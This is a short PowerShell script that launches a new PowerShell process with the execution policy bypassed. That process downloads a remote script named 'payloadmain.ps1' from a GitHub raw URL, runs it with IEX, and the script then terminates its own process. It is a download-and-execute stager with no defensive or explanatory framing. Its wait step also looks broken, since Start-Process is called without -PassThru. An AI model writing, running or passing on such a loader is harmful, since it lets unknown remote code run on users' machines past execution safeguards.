# Get the current PowerShell process
$currentProcess = Get-Process -Id $PID

# Start a new hidden PowerShell process
$newProcess = Start-Process powershell -ArgumentList @('-NoProfile', '-ExecutionPolicy Bypass', '-Command', 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/EffortPeaked/gsdttsada/main/payloadmain.ps1'')')

# Wait for the new process to finish
$newProcess.WaitForExit()

# Close the old PowerShell process
Stop-Process -Id $currentProcess.Id
